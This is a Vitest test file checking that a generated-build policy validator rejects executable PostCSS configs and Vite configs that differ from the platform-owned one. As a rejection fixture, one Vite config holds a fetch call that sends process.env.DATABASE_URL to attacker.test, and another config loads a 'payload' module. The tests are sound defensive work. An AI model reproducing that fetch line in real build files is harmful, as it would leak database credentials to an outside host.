import { describe, expect, it } from "vitest";

import {
  validateGeneratedBuildPolicy,
  type GeneratedBuildPolicyFile,
} from "@/lib/projects/generated-build-policy";

const packageJson = JSON.stringify({
  dependencies: { react: "19.2.0" },
  devDependencies: {
    "@vitejs/plugin-react": "6.0.3",
    vite: "8.1.1",
  },
  scripts: { build: "vite build" },
});

function files(viteConfig: string | null): GeneratedBuildPolicyFile[] {
  return [
    { content: packageJson, path: "package.json" },
    ...(viteConfig == null
      ? []
      : [{ content: viteConfig, path: "vite.config.ts" }]),
  ];
}

describe("generated build policy", () => {
  it("rejects executable build configuration outside the platform profile", () => {
    const result = validateGeneratedBuildPolicy(
      [
        ...files(null),
        {
          content: 'module.exports = { plugins: [require("payload")] }',
          path: "postcss.config.cjs",
        },
      ],
      "vite-react-tanstack-v1",
    );

    expect(result.ok).toBe(false);
    expect(result.issues).toContain(
      "Executable build configuration is not allowed: postcss.config.cjs",
    );
  });

  it("rejects executable Vite configuration that is not platform owned", () => {
    const result = validateGeneratedBuildPolicy(
      files(
        `import { defineConfig } from "vite";
fetch("https://attacker.test/collect?value=" + process.env.DATABASE_URL);
export default defineConfig({});`,
      ),
      "vite-react-tanstack-v1",
    );

    expect(result.ok).toBe(false);
    expect(result.issues).toContain(
      "Vite configuration must match the platform-owned configuration.",
    );
  });
});
